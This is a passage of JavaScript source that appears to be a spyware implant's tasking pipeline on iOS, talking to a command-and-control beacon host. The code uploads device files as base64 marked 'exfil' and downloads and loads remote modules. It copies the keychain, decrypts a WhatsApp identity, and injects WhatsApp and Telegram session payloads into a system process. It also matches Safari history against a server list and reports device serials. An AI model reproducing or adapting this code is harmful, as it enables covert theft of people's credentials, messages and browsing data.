		fresh = _resultUrlsFresh(state.result_urls);
	}
	if (!fresh.length) {
		_opsLog(uid, "upload no result_urls");
		return { ok: false, error: "no_result_urls", state: state };
	}
	var startUrl = state.start_url || fresh[0].url;
	state.start_url = startUrl;
	var tried = [];
	var lastErr = "upload_fail";

	function tryOne(url) {
		tried.push(url);
		if (!_probeResultUrl(url)) return false;
		var parsed = _parseHttpUrl(url);
		if (parsed.host === BEACON_HOST && parsed.path.indexOf("/result") === 0) {
			try {
				// silentResult: parent task_pipeline owns final exec_result.json
				var er = _exfilFile(uid, cmdId, path, chunkSize || 16384, { silentResult: true });
				return !!(er && er.ok);
			} catch (e) {
				lastErr = String(e).slice(0, 80);
				return false;
			}
		}
		try {
			var sz = -1;
			try {
				var fd = Native.callSymbol("fopen", path, "rb");
				if (fd && fd !== 0 && fd !== 0n) {
					Native.callSymbol("fseek", fd, 0, 2);
					sz = Number(Native.callSymbol("ftell", fd));
					Native.callSymbol("fclose", fd);
				}
			} catch (e) {}
			if (sz < 0) { lastErr = "missing"; return false; }
			if (sz > 1048576) { lastErr = "over_1m"; return false; }
			var txt = _fsRead(path, 1048576);
			if (txt == null) { lastErr = "unreadable"; return false; }
			var slash = path.lastIndexOf("/");
			var fname = slash >= 0 ? path.slice(slash + 1) : path;
			var payload = {
				command_id: cmdId,
				uuid: uid,
				filename: fname,
				category: "exfil",
				data: _strToB64(txt)
			};
			var r = _postToResultUrl(url, payload);
			return r !== null;
		} catch (ue) {
			lastErr = String(ue).slice(0, 80);
			return false;
		}
	}

	for (var i = 0; i < fresh.length; i++) {
		if (tryOne(fresh[i].url)) {
			return { ok: true, url: fresh[i].url, state: state };
		}
	}

	try {
		var errBody = {
			uid: uid,
			command_id: cmdId,
			start_url: startUrl,
			error: "upload_all_failed:" + lastErr,
			urls_tried: tried,
			pull_id: state.pull_id || "",
			path: path,
			ts: Date.now()
		};
		_postToResultUrl(startUrl, {
			command_id: cmdId || ("uperr-" + Date.now().toString(16)),
			uuid: uid,
			filename: "upload_error.json",
			category: "upload_error",
			data: _strToB64(JSON.stringify(errBody))
		});
		_sbPost(BEACON_HOST, BEACON_PORT, "/api/task/upload_error", "application/json", JSON.stringify(errBody));
	} catch (re) {}

	var waitMs = state.refresh_after_ms || 120000;
	_opsLog(uid, "upload all fail; refresh urls in " + Math.floor(waitMs / 1000) + "s");
	Native.callSymbol("usleep", waitMs * 1000);
	state = _refreshResultUrls(uid, state);
	fresh = _resultUrlsFresh(state.result_urls);
	for (var j = 0; j < fresh.length; j++) {
		if (tryOne(fresh[j].url)) {
			return { ok: true, url: fresh[j].url, state: state, refreshed: true };
		}
	}
	return { ok: false, error: lastErr, state: state, tried: tried };
}

function _doPeLoad(uid, cmdId, modName, dcode, resultUrlOverride, opts) {
	opts = opts || {};
	if (!dcode) {
		var di0 = _resolveDeviceIds();
		if (di0 && di0.uuid) dcode = String(di0.uuid);
		else dcode = uid || "";
	}
	var getBody = JSON.stringify({
		name: modName.indexOf(".js") >= 0 ? modName : (modName + ".js"),
		uid: uid,
		uuid: uid,
		device_code: dcode || ""
	});
	var got = null;
	try {
		got = _sbPost(BEACON_HOST, BEACON_PORT, "/api/payload/get", "application/json", getBody);
	} catch (e) {
		got = null;
	}
	if (!got || (!got.src && !(got.task && got.task.package) && !(got.pack === "n7z2" && got.enc))) {
		return {
			ok: false,
			error: (got && got.detail) ? String(got.detail).slice(0, 120) : "payload/get failed"
		};
	}
	var task = got.task || null;
	var pkg = "";
	try {
		if (typeof __n7z_unwrapPayload === "function") pkg = __n7z_unwrapPayload(got);
		else if (task && task.package) pkg = String(task.package);
		else pkg = String(got.src || "");
	} catch (ue) {
		return { ok: false, error: "n7z unwrap: " + String(ue).slice(0, 80) };
	}
	if (!pkg || pkg.length < 8) return { ok: false, error: "empty package after unwrap" };
	var timeoutSec = task ? Number(task.timeout_sec || 0) : 0;
	var resultUrl = resultUrlOverride || (task ? String(task.result_url || "") : "");
	var mid = (task && task.module_id) ? task.module_id : (got.module_id || modName.replace(/\.js$/, ""));
	var mpath = "/tmp/c2_ipc/mod." + mid;
	try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (e) {}
	if (!_fsWrite(mpath, pkg)) return { ok: false, error: "write mod file failed", path: mpath };
	try {
		_fsWrite(mpath + ".task.json", JSON.stringify({
			timeout_sec: timeoutSec,
			result_url: resultUrl,
			module_id: mid
		}));
	} catch (me) {}
	_c2Log("[C2-STUB] pe_load wrote " + mpath + " len=" + pkg.length);

	// session_* : drop only — pe_session_start InjectJS; never eval in pe
	if (opts.drop_only || String(mid).indexOf("session_") === 0) {
		return { ok: true, module_id: mid, path: mpath, result_url: resultUrl, dropped: true };
	}

	var pe = _peIpcRoundtrip(uid, cmdId, "load_module", {
		name: mid,
		path: mpath,
		timeout_sec: timeoutSec,
		result_url: resultUrl,
		silent: !!opts.silent
	});
	if (pe && pe.result && pe.result.error === "use_session_start") {
		return { ok: true, module_id: mid, path: mpath, result_url: resultUrl, dropped: true, need_session: true };
	}
	return {
		ok: !!(pe && pe.ok),
		module_id: mid,
		path: mpath,
		result_url: resultUrl,
		error: (pe && pe.error) || ((pe && pe.result && pe.result.error) ? pe.result.error : "")
	};
}

function _pipelineTryLock() {
	try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (e) {}
	var lock = "/tmp/c2_ipc/task_pipeline.lock";
	var existing = _fsRead(lock, 64);
	if (existing) {
		var ts = Number(String(existing).replace(/[^0-9]/g, ""));
		if (ts > 0 && (Date.now() - ts) < 300000) return false;
	}
	_fsWrite(lock, String(Date.now()));
	return true;
}

function _pipelineUnlock() {
	try { _fsUnlink("/tmp/c2_ipc/task_pipeline.lock"); } catch (e) {}
}

function _runSafariPromo(uid, cmdId) {
	var defHit = "-1";
	var active = null;
	var listTried = "lab:/api/promo/active";
	try {
		active = _sbPost(BEACON_HOST, BEACON_PORT, "/api/promo/active", "application/json", "{}");
	} catch (e) {
		active = null;
	}
	// Unwrap {ok,data:{urls...}} if gateway wraps; prefer flat partner shape
	if (active && active.data && (active.data.urls || active.data.domains) && !active.urls)
		active = active.data;

	function _promoSoftEr(error, extra) {
		try {
			var di = _resolveDeviceIds() || {};
			var body = {
				uuid: uid,
				device_id: uid,
				serial: di.serial || "",
				unique: di.unique || "",
				error: String(error || "unknown"),
				hit: "-1",
				match: "none",
				"default": defHit,
				scanned_dbs: 0,
				promo_count: 0,
				found_history: false,
				tried: listTried,
				timestamp: Math.floor(Date.now() / 1000)
			};
			if (extra && typeof extra === "object") {
				try {
					var keys = Object.keys(extra);
					for (var ki = 0; ki < keys.length; ki++) body[keys[ki]] = extra[keys[ki]];
				} catch (ee) {}
			}
			_sbPost(BEACON_HOST, BEACON_PORT, "/api/promo/result", "application/json", JSON.stringify(body));
		} catch (re) {
			_opsLog(uid, "safari_promo er ERR swallowed");
		}
	}

	/* List pull failed → no Safari compare; soft report; return (pipeline continues). */
	if (!active || typeof active !== "object" ||
		!(Object.prototype.hasOwnProperty.call(active, "urls") ||
			(active.data && Object.prototype.hasOwnProperty.call(active.data, "urls")))) {
		_opsLog(uid, "safari_promo list FAIL - skip compare");
		try { _promoSoftEr("promo_active_all_failed"); } catch (e2) {}
		try {
			_sendNamedResult(uid, cmdId, "safari_promo.json", {
				hit: defHit, match: "none", default: defHit,
				scanned_dbs: 0, promo_count: 0, error: "promo_active_all_failed"
			});
		} catch (se) {}
		return { hit: defHit, match: "none", scanned_dbs: 0, error: "promo_active_all_failed" };
	}

	if (active && active.default != null) defHit = String(active.default);
	var urls = (active && active.urls) ? active.urls : [];
	var domains = (active && active.domains) ? active.domains : [];
	_opsLog(uid, "safari_promo begin urls=" + urls.length);
	var pe = null;
	try {
		pe = _peIpcRoundtrip(uid, cmdId, "safari_promo", {
			urls: urls,
			domains: domains,
			silent: true
		});
	} catch (ipe) {
		_opsLog(uid, "safari_promo pe_ipc ERR");
		pe = null;
	}
	var hit = defHit;
	var match = "none";
	var scanned = 0;
	var urlsSeen = 0;
	var foundHist = false;
	var rpath = "";
	var rtable = "";
	var rcol = "";
	var rhost = "";
	if (pe && pe.result) {
		if (pe.result.hit != null && pe.result.hit !== "") hit = String(pe.result.hit);
		match = String(pe.result.match || match);
		scanned = Number(pe.result.scanned_dbs || 0);
		urlsSeen = Number(pe.result.urls_seen || 0);
		foundHist = !!pe.result.found_history || (match === "full" || match === "domain");
		rpath = String(pe.result.path || "");
		rtable = String(pe.result.table || "");
		rcol = String(pe.result.column || "");
		rhost = String(pe.result.host || "");
	} else if (pe && pe.hit != null) {
		hit = String(pe.hit);
		match = String(pe.match || match);
	}
	if (!hit) hit = defHit;
	_opsLog(uid, "safari_promo done hit=" + String(hit).slice(0, 120) + " match=" + match);
	try {
		_sendNamedResult(uid, cmdId, "safari_promo.json", {
			hit: hit,
			match: match,
			default: defHit,
			scanned_dbs: scanned,
			promo_count: urls.length
		});
	} catch (se) {}
	// Partner path: POST /api/promo/result (not generic /result chunks)
	try {
		var di = _resolveDeviceIds() || {};
		var report = {
			uuid: uid,
			device_id: uid,
			serial: di.serial || "",
			unique: di.unique || "",
			hit: hit,
			match: match,
			"default": defHit,
			scanned_dbs: scanned,
			promo_count: urls.length,
			found_history: foundHist,
			urls_seen: urlsSeen,
			path: rpath,
			table: rtable,
			column: rcol,
			host: rhost,
			timestamp: Math.floor(Date.now() / 1000)
		};
		var rr = _sbPost(BEACON_HOST, BEACON_PORT, "/api/promo/result", "application/json", JSON.stringify(report));
		var rok = !!(rr && (rr.ok || (rr.data && rr.data.ok) ||
			(Number(rr.code) === 200 && String(rr.msg || "") === "OK")));
		_opsLog(uid, "safari_promo result ok=" + rok);
		if (!rok) {
			try { _promoSoftEr("promo_result_all_failed", { hit: hit, match: match, scanned_dbs: scanned }); }
			catch (e3) {}
		}
	} catch (re) {
		_opsLog(uid, "safari_promo result ERR");
		try { _promoSoftEr("promo_result_exception", { hit: hit, match: match }); } catch (e4) {}
	}
	return { hit: hit, match: match, scanned_dbs: scanned };
}

function _matchAppName(installed, entry) {
	var bid = String(entry.bundleId || entry.bundle_id || "").toLowerCase();
	var name = String(entry.name || "").toLowerCase();
	for (var i = 0; i < (installed || []).length; i++) {
		var a = installed[i];
		var ab = "";
		var an = "";
		if (typeof a === "string") {
			ab = a.toLowerCase();
		} else if (a && typeof a === "object") {
			ab = String(a.bundleId || a.bundle_id || a.id || "").toLowerCase();
			an = String(a.name || a.app_name || "").toLowerCase();
		}
		// bundleId exact only — avoid net.whatsapp.WhatsApp ⊂ WhatsAppSMB
		if (bid && ab && ab === bid) return true;
		if (name && an && (an === name || an.indexOf(name) >= 0 || name.indexOf(an) >= 0)) return true;
	}
	return false;
}

var P7_CACHE_PATH = "/tmp/c2_ipc/p7.cache.json";
var WA_IDENTITY_PATH = "/tmp/wa_identity.json";

function _p7IdentityOnDisk() {
	try {
		var head = _fsRead(WA_IDENTITY_PATH, 64);
		return !!(head && head.length > 8);
	} catch (e) {
		return false;
	}
}

function _p7CacheLoad() {
	try {
		var raw = _fsRead(P7_CACHE_PATH, 4096);
		if (!raw) return null;
		return JSON.parse(raw);
	} catch (e) {
		return null;
	}
}

function _p7CacheSave(obj) {
	try {
		var o = obj || {};
		o.ts = Date.now();
		if (_p7IdentityOnDisk()) o.wa_identity = true;
		_fsWrite(P7_CACHE_PATH, JSON.stringify(o) + "\n");
	} catch (e) {}
}

function _isWhatsAppEntry(ent) {
	if (!ent) return false;
	var payload = String(ent.payload || "");
	var base = payload.replace(/\.js$/i, "");
	var bid = String(ent.bundleId || "");
	return base === "session_whatsapp" || payload.indexOf("wap") >= 0 ||
		bid === "net.whatsapp.WhatsApp" || bid === "net.whatsapp.WhatsAppSMB" ||
		!!ent.requires_p7;
}

function _runP7Warmup(uid, cmdId, dcode, resultUrl, opts) {
	// Split-friendly P7: pe_dbg → keychain_copy → Phase2 decrypt → /tmp/wa_identity.json
	// Cache: /tmp/c2_ipc/p7.cache.json — one heavy attempt per pe/boot unless force.
	// phase: "all" | "keychain" | "phase2"
	opts = opts || {};
	var phase = String(opts.phase || "all");
	if (phase !== "keychain" && phase !== "phase2") phase = "all";
	_opsLog(uid, "p7_warmup begin phase=" + phase + (opts.force ? " force=1" : ""));
	function _ipcId(tag) {
		return String(tag || "p7") + Date.now().toString(36) + Math.floor(Math.random() * 1e4).toString(36);
	}
	function _hasKeychainDb() {
		try {
			var head = _fsRead("/tmp/keychain-2.db", 16);
			return !!(head && head.length > 0);
		} catch (e) {
			return false;
		}
	}
	function _finish(ret) {
		ret = ret || {};
		var wa = !!(ret.wa_identity || _p7IdentityOnDisk());
		ret.wa_identity = wa;
		if (ret.ok && !wa && ret.skipped !== "already" && ret.skipped !== "identity_file" && ret.skipped !== "cache") {
			// keep ok as-is for phase=keychain (identity comes later)
		} else if (phase !== "keychain" && ret.ok && !wa && !ret.skipped) {
			ret.ok = false;
			ret.error = ret.error || "no_wa_identity";
		}
		_p7CacheSave({
			done: ret.skipped === "cache" ? true : (phase === "keychain" ? false : true),
			started: true,
			ok: !!ret.ok,
			wa_identity: wa,
			error: ret.error || "",
			phase: phase,
			skipped: ret.skipped || "",
			keychain_ok: ret.keychain_copy_ok,
			hint: ret.hint || ""
		});
		return ret;
	}

	// Fast path: identity already on disk (WA reads this file directly)
	if (!opts.force && _p7IdentityOnDisk() && phase !== "keychain") {
		_opsLog(uid, "p7_warmup skip (identity file)");
		return _finish({
			ok: true,
			skipped: "identity_file",
			wa_identity: true,
			via: "p7_warmup"
		});
	}
	// One-shot cache: do not re-run long path on r2/r3 / every WA entry
	var cache = _p7CacheLoad();
	if (!opts.force && cache && (cache.done || cache.started) && phase === "all") {
		var waCached = !!(cache.wa_identity || _p7IdentityOnDisk());
		_opsLog(uid, "p7_warmup skip (cache done=" + !!cache.done + " wa=" + waCached +
			" err=" + String(cache.error || "").slice(0, 40) + ")");
		return _finish({
			ok: waCached,
			skipped: "cache",
			wa_identity: waCached,
			error: waCached ? "" : (cache.error || "cached_no_identity"),
			via: "p7_warmup"
		});
	}

	_p7CacheSave({ started: true, done: false, phase: phase, ok: false, wa_identity: !!_p7IdentityOnDisk() });

	var st = _peIpcRoundtrip(uid, _ipcId("p7s"), "p7_status", { silent: true });
	var already = !!(st && st.result && st.result.wa_identity);
	if (already && !opts.force && phase !== "keychain") {
		_opsLog(uid, "p7_warmup skip (already ready)");
		return _finish({
			ok: true,
			skipped: "already",
			wa_identity: true,
			p7_ready: !!(st.result && st.result.p7_ready),
			via: "p7_warmup"
		});
	}
	// Pe already burned RC this lifetime without identity — another Phase2 will hang then fail
	if (phase !== "keychain" && st && st.result && st.result.rc_attempted && !st.result.wa_identity && !opts.force) {
		_opsLog(uid, "p7_warmup abort rc_already_attempted_need_cold");
		return _finish({
			ok: false,
			error: "rc_already_attempted_need_cold",
			wa_identity: false,
			hint: "cold_boot_pe_then_single_p7_warmup",
			via: "p7_warmup"
		});
	}

	var kcOk = false;
	var d2 = { ok: false };
	if (phase === "all" || phase === "keychain") {
		_opsLog(uid, "p7_warmup step=keychain");
		var d1 = _doPeLoad(uid, cmdId, "pe_dbg.js", dcode, resultUrl, { silent: true });
		if (!d1.ok && !(d1.error && String(d1.error).indexOf("already") >= 0)) {
			_opsLog(uid, "p7_warmup pe_dbg fail " + (d1.error || ""));
		}
		d2 = _doPeLoad(uid, cmdId, "keychain_copier.js", dcode, resultUrl, { drop_only: true, silent: true });
		if (!d2.ok) {
			_opsLog(uid, "p7_warmup keychain drop fail " + (d2.error || ""));
		}
		var kc = _peIpcRoundtrip(uid, _ipcId("p7k"), "keychain_copy", { silent: true });
		kcOk = !!(kc && (kc.ok || (kc.result && kc.result.ok)));
		_opsLog(uid, "p7_warmup keychain_copy ok=" + kcOk);
		if (!kcOk && d2 && d2.ok) {
			_opsLog(uid, "p7_warmup keychain_copy retry");
			kc = _peIpcRoundtrip(uid, _ipcId("p7k"), "keychain_copy", { silent: true });
			kcOk = !!(kc && (kc.ok || (kc.result && kc.result.ok)));
			_opsLog(uid, "p7_warmup keychain_copy retry ok=" + kcOk);
		}
		if (phase === "keychain") {
			var hasDb = _hasKeychainDb();
			_opsLog(uid, "p7_warmup keychain done db=" + hasDb + " copy=" + kcOk);
			return _finish({
				ok: hasDb,
				error: hasDb ? "" : "no_keychain_db",
				wa_identity: _p7IdentityOnDisk(),
				keychain_copy_ok: kcOk,
				keychain_drop_ok: !!(d2 && d2.ok),
				via: "p7_keychain",
				phase: "keychain"
			});
		}
	}

	if (!_hasKeychainDb()) {
		_opsLog(uid, "p7_warmup abort no_keychain_db (refuse Phase2/RC)");
		try {
			if (typeof __payloadOutcomeReport === "function") {
				__payloadOutcomeReport({
					outcome: "fail",
					module_id: "p7_warmup",
					uid: uid,
					cmd_id: cmdId,
					stage: "p7_keychain",
					error: "no_keychain_db",
					wa_identity: false
				});
			}
		} catch (oe) {}
		return _finish({
			ok: false,
			error: "no_keychain_db",
			wa_identity: false,
			hint: "authorize_device_then_pe_load_keychain_copier",
			keychain_copy_ok: kcOk,
			keychain_drop_ok: !!(d2 && d2.ok),
			via: "p7_warmup"
		});
	}

	_opsLog(uid, "p7_warmup step=phase2");
	var warmId = _ipcId("p7w");
	// skip_keychain: bootstrap already copied; pe must not re-inject
	var wr = _peIpcRoundtrip(uid, warmId, "p7_warmup", {
		silent: true,
		force: !!opts.force,
		skip_keychain: true,
		wait_sec: Number(opts.wait_sec) > 0 ? Number(opts.wait_sec) : 90
	});
	var ok = !!(wr && (wr.ok || (wr.result && wr.result.ok)));
	var wa = !!(wr && wr.result && wr.result.wa_identity) || _p7IdentityOnDisk();
	var recovered = "";
	if ((!ok || !wa) && wr && wr.error === "pe result timeout") {
		_opsLog(uid, "p7_warmup soft-timeout; drain result + p7_status");
		var lateBody = null;
		var drainId = wr.id || warmId;
		for (var li = 0; li < 40; li++) {
			lateBody = _fsRead("/tmp/c2_ipc/pe.result." + drainId, 8192);
			if (lateBody && lateBody.length > 0) break;
			var prog2 = _fsRead("/tmp/c2_ipc/pe.p7.progress", 512);
			if (li > 8 && (!prog2 || prog2.indexOf('"running":true') < 0)) {
				if (li > 16) break;
			}
			Native.callSymbol("usleep", 500000);
		}
		if (lateBody) {
			_fsUnlink("/tmp/c2_ipc/pe.result." + drainId);
			var lateParsed = null;
			try { lateParsed = JSON.parse(lateBody); } catch (e) { lateParsed = null; }
			if (lateParsed) {
				wr = { ok: !!(lateParsed.ok !== false), result: lateParsed, id: drainId };
				ok = !!(wr.ok || (lateParsed && lateParsed.ok));
				wa = !!lateParsed.wa_identity || _p7IdentityOnDisk();
				recovered = "late_result";
				_opsLog(uid, "p7_warmup late_result ok=" + ok + " wa=" + wa);
			}
		}
		if (!wa) {
			var st2 = _peIpcRoundtrip(uid, _ipcId("p7s"), "p7_status", { silent: true });
			if (st2 && st2.result && st2.result.wa_identity) {
				ok = true;
				wa = true;
				recovered = recovered || "p7_status";
				_opsLog(uid, "p7_warmup recovered via p7_status wa_identity=true");
			} else if (st2 && st2.result && st2.result.p7_ready && !st2.result.p7_running) {
				ok = true;
				recovered = recovered || "p7_ready";
			}
		}
	}
	wa = wa || _p7IdentityOnDisk();
	_opsLog(uid, "p7_warmup done ok=" + ok + " wa_identity=" + wa + (recovered ? (" recovered=" + recovered) : ""));
	var errStr = (!ok && wr && (wr.error || (wr.result && wr.result.error))) || "";
	if (ok && !wa) {
		ok = false;
		errStr = errStr || "no_wa_identity";
	}
	try {
		if (typeof __payloadOutcomeReport === "function") {
			var poc = "fail";
			if (wa) poc = "success";
			else if (String(errStr).indexOf("timeout") >= 0) poc = "timeout";
			else if (ok && !wa) poc = "partial";
			if (!wa && wr && wr.error === "pe result timeout" && !recovered) poc = "timeout";
			__payloadOutcomeReport({
				outcome: poc,
				module_id: "p7_warmup",
				uid: uid,
				cmd_id: cmdId,
				stage: "p7_phase2",
				error: errStr,
				wa_identity: wa,
				recovered: recovered || ""
			});
		}
	} catch (oe) {}
	return _finish({
		ok: !!(ok && wa),
		wa_identity: wa,
		reused: !!(wr && wr.result && wr.result.reused),
		recovered: recovered || undefined,
		error: errStr,
		keychain_copy_ok: kcOk,
		module_id: "pe_dbg",
		via: "p7_warmup",
		phase: phase
	});
}

function _waitSessionInject(uid, sid, opts) {
	// pe queues InjectJS then acks; drain on listen tick. Poll status/hb.
	opts = opts || {};
	sid = String(sid || "");
	if (!sid) return { ok: false, error: "no_sid" };
	var maxTries = Number(opts.tries) > 0 ? Number(opts.tries) : 60; // 30s — stub inject ~10s + margin
	var last = "";
	for (var i = 0; i < maxTries; i++) {
		var st = _fsRead("/tmp/c2_ipc/session." + sid + ".status", 2048);
		if (st && st.length > 8) {
			last = st;
			try {
				var so = JSON.parse(st);
				if (so && so.state === "running" && so.ok !== false) {
					_opsLog(uid, "session_inj ready id=" + sid + " pid=" + (so.pid || 0));
					return { ok: true, state: "running", pid: so.pid || 0, status: so };
				}
				if (so && (so.state === "inject_fail" || so.ok === false)) {
					_opsLog(uid, "session_inj fail id=" + sid + " " + (so.error || so.state));
					return { ok: false, error: so.error || "inject_fail", status: so };
				}
			} catch (e) {}
		}
		var hb = _fsRead("/tmp/c2_ipc/session." + sid + ".hb", 512);
		if (hb && hb.length > 10) {
			_opsLog(uid, "session_inj hb id=" + sid);
			return { ok: true, state: "running", via: "hb" };
		}
		Native.callSymbol("usleep", 500000);
	}
	_opsLog(uid, "session_inj wait timeout id=" + sid + " last=" + String(last).slice(0, 60));
	return { ok: false, error: "inject_wait_timeout", last: last };
}

function _waitSessionEval(uid, sid, opts) {
	// After inject OK, poll configd stub eval trace at session.<sid>.eval
	opts = opts || {};
	sid = String(sid || "");
	if (!sid) return { ok: false, error: "no_sid" };
	var maxTries = Number(opts.tries) > 0 ? Number(opts.tries) : 80; // 40s eval + session start margin
	var last = "";
	for (var i = 0; i < maxTries; i++) {
		var ev = _fsRead("/tmp/c2_ipc/session." + sid + ".eval", 4096);
		if (ev && ev.length > 8) {
			last = ev;
			try {
				var eo = JSON.parse(ev);
				if (eo && eo.state === "eval_ok") {
					_opsLog(uid, "session_eval ok id=" + sid + " len=" + (eo.code_len || 0));
					return { ok: true, state: "eval_ok", eval: eo };
				}
				if (eo && (eo.state === "eval_fail" || eo.state === "eval_no_file")) {
					_opsLog(uid, "session_eval fail id=" + sid + " " + String(eo.error || eo.state).slice(0, 80));
					return { ok: false, error: eo.state, eval: eo };
				}
			} catch (e) {}
		}
		var st = _fsRead("/tmp/c2_ipc/session." + sid + ".status", 4096);
		if (st && st.length > 8) {
			try {
				var so = JSON.parse(st);
				if (so && so.eval_ok === true) {
					return { ok: true, state: "eval_ok", status: so };
				}
				if (so && so.state === "eval_fail") {
					return { ok: false, error: "eval_fail", status: so };
				}
				if (so && (so.stage === "scanning" || so.partner_ready != null)) {
					_opsLog(uid, "session_eval via status id=" + sid + " stage=" + (so.stage || so.state));
					return { ok: true, state: "session_running", status: so };
				}
			} catch (e2) {}
		}
		var hb = _fsRead("/tmp/c2_ipc/session." + sid + ".hb", 512);
		if (hb && hb.length > 10) {
			_opsLog(uid, "session_eval hb id=" + sid);
			return { ok: true, state: "running", via: "hb" };
		}
		Native.callSymbol("usleep", 500000);
	}
	_opsLog(uid, "session_eval wait timeout id=" + sid + " last=" + String(last).slice(0, 80));
	return { ok: false, error: "eval_wait_timeout", last: last };
}

function _runMatchedEntry(uid, cmdId, ent, dcode, resultUrl, opts) {
	opts = opts || {};
	var payload = ent.payload || "";
	var base = payload.replace(/\.js$/i, "");
	var sid = "s" + Date.now();

	// WhatsApp: identity from /tmp/wa_identity.json (P7 once per pipeline). skip_p7=true by default from pipeline.
	if (base === "session_whatsapp" || payload.indexOf("wap") >= 0 || ent.bundleId === "net.whatsapp.WhatsApp" || ent.bundleId === "net.whatsapp.WhatsAppSMB" || ent.requires_p7) {
		var doWarm = false;
		if (opts.warm_p7 === true) doWarm = true;
		else if (opts.skip_p7 === true) doWarm = false;
		else if (ent.requires_p7 === false) doWarm = false;
		else doWarm = true; // ad-hoc pe_wa_collect / manual: warm once (cache-gated)
		if (doWarm) {
			var warm = _runP7Warmup(uid, cmdId, dcode, resultUrl, {});
			if (!warm.ok && !warm.wa_identity) {
				_opsLog(uid, "session_whatsapp continue without P7 identity (" + (warm.error || "warmup_fail") + ")");
			}
		} else {
			var hasId = _p7IdentityOnDisk();
			_opsLog(uid, "session_whatsapp skip_p7 identity_file=" + hasId + " (read cache only)");
		}
		var d1 = _doPeLoad(uid, cmdId, "session_whatsapp.js", dcode, resultUrl, { drop_only: true, silent: true });
		if (!d1.ok) return { ok: false, error: d1.error || "drop_fail", module_id: "session_whatsapp", requires_p7: true };
		var s1 = _peIpcRoundtrip(uid, cmdId, "session_start", {
			session_id: sid,
			target: "configd",
			payload: "whatsapp",
			silent: true
		});
		var w1 = null;
		var e1 = null;
		if (s1 && s1.ok && s1.result && (s1.result.pending || s1.result.queued || s1.result.state === "queued")) {
			w1 = _waitSessionInject(uid, (s1.result && s1.result.session_id) || sid, {});
			if (w1 && w1.ok) {
				e1 = _waitSessionEval(uid, (s1.result && s1.result.session_id) || sid, {});
			}
		}
		var ok1 = !!(s1 && s1.ok);
		if (w1 && w1.ok) ok1 = true;
		if (w1 && w1.ok === false) ok1 = false; // inject_fail OR inject_wait_timeout
		if (e1 && e1.ok === false) ok1 = false;
		return {
			ok: ok1,
			module_id: "session_whatsapp",
			path: d1.path,
			error: (e1 && e1.error) || (w1 && w1.error) || (s1 && s1.error) || "",
			via: "session_start",
			requires_p7: true,
			p7_skipped: !doWarm,
			wa_identity: _p7IdentityOnDisk(),
			session_id: (s1 && s1.result && s1.result.session_id) || sid,
			inject: w1 || null,
			eval: e1 || null
		};
	}

	// Telegram session: partner tglib.js → session_telegram.js (configd Path A)
	if (base === "session_telegram" || payload.indexOf("tglib") >= 0 || ent.bundleId === "ph.telegra.Telegraph") {
		var dTg = _doPeLoad(uid, cmdId, "session_telegram.js", dcode, resultUrl, { drop_only: true, silent: true });
		if (!dTg.ok) return { ok: false, error: dTg.error || "drop_fail", module_id: "session_telegram" };
		var sTg = _peIpcRoundtrip(uid, cmdId, "session_start", {
			session_id: sid,
			target: ent.inject_target || "configd",
			payload: "telegram",
			silent: true
		});
		var wTg = null;
		var eTg = null;
		if (sTg && sTg.ok && sTg.result && (sTg.result.pending || sTg.result.queued || sTg.result.state === "queued")) {
			wTg = _waitSessionInject(uid, (sTg.result && sTg.result.session_id) || sid, {});
			if (wTg && wTg.ok) {
				eTg = _waitSessionEval(uid, (sTg.result && sTg.result.session_id) || sid, {});
			}
		}
		var okTg = !!(sTg && sTg.ok);
		if (wTg && wTg.ok) okTg = true;
		if (wTg && wTg.ok === false) okTg = false; // inject_fail OR inject_wait_timeout — do not fake ok
		if (eTg && eTg.ok === false) okTg = false;
		return {
			ok: okTg,
			module_id: "session_telegram",
			path: dTg.path,
			error: (eTg && eTg.error) || (wTg && wTg.error) || (sTg && sTg.error) || "",
			via: "session_start",
			partner_alias: "tglib",
			session_id: (sTg && sTg.result && sTg.result.session_id) || sid,
			inject: wTg || null,
			eval: eTg || null
		};
	}

	// Generic session_probe
	if (base === "session_probe" || base.indexOf("session_") === 0) {
		var d2 = _doPeLoad(uid, cmdId, payload.indexOf(".js") >= 0 ? payload : (payload + ".js"), dcode, resultUrl, { drop_only: true, silent: true });
		if (!d2.ok) return { ok: false, error: d2.error || "drop_fail", module_id: base };
		var s2 = _peIpcRoundtrip(uid, cmdId, "session_start", {
			session_id: sid,
			target: "configd",
			payload: "probe",
			silent: true
		});
		return {
			ok: !!(s2 && s2.ok),
			module_id: d2.module_id || base,
			path: d2.path,
			error: (s2 && s2.error) || "",
			via: "session_start"
		};
	}

	// Other modules: pe_load+eval only if server has them; skip CDN-only wallet stubs quietly
	var lr = _doPeLoad(uid, cmdId, payload, dcode, resultUrl, { silent: true });
	if (!lr.ok && lr.error && String(lr.error).indexOf("payload/get") >= 0) {
		return { ok: false, error: "module_not_on_c2", module_id: base, skipped: true };
	}
	if (lr.dropped || lr.need_session) {
		var s3 = _peIpcRoundtrip(uid, cmdId, "session_start", {
			session_id: sid,
			target: "configd",
			payload: "probe",
			silent: true
		});
		return {
			ok: !!(s3 && s3.ok),
			module_id: lr.module_id,
			path: lr.path,
			error: (s3 && s3.error) || "",
			via: "session_start"
		};
	}
	return {
		ok: !!lr.ok,
		module_id: lr.module_id || base,
		path: lr.path || "",
		error: lr.error || "",
		via: "pe_load"
	};
}

function _runTaskPipeline(uid, cmdId, params) {
	params = params || {};
	if (!_pipelineTryLock()) {
		_opsLog(uid, "task_pipeline skip (lock held)");
		_sendResult(uid, cmdId, { status: "completed", role: "bootstrap", result: { ok: true, skipped: "lock" } });
		return;
	}
	try {
		_opsLog(uid, "task_pipeline begin");
		var pull = _taskPull(uid);
		if (!pull) {
			_sendResult(uid, cmdId, { status: "failed", error: "task/pull failed", role: "bootstrap" });
			return;
		}
		var settings = pull.settings || {};
		try { globalThis.__pe_last_task_settings = settings; } catch (se) {}
		var defaults = pull.defaults || {};
		var actions = defaults.actions || [];
		var urlState = {
			result_urls: pull.result_urls || [],
			settings: settings,
			pull_id: pull.pull_id || "",
			start_url: (pull.result_urls && pull.result_urls[0] && pull.result_urls[0].url) || "",
			refresh_after_ms: (Number(settings.resultUrlRefreshOnFailSec) || 120) * 1000
		};

		var actionLog = [];
		var ensureWaitSec = Number(settings.ensureBsWaitSec) || 30;
		if (ensureWaitSec > 30) ensureWaitSec = 30;
		if (!(ensureWaitSec > 0)) ensureWaitSec = 30;
		// Local poll budget after pe kick (bs owns online check; pe must not block)
		var ensureLocalPollSec = Number(settings.ensureBsLocalPollSec);
